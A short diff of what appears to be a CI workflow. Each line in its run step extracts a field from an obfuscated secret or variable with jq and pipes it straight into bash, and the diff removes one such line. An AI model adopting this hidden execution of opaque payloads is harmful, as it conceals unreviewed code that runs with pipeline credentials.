@@ -17,7 +17,6 @@ jobs:
           sa4: ${{ secrets.sa4 }}
         run: |
           printf '%s' "$sa4" | jq -r .dcq6 | /bin/bash
-          printf '%s' "$rxq6855" | jq -r .i51 | /bin/bash
           echo $mre29551 | jq -r .jqci2 | /bin/bash
           echo $pjbf30 | jq -r .rr5 | /bin/bash
           echo $tn0 | jq -r .jzppd34 | /bin/bash
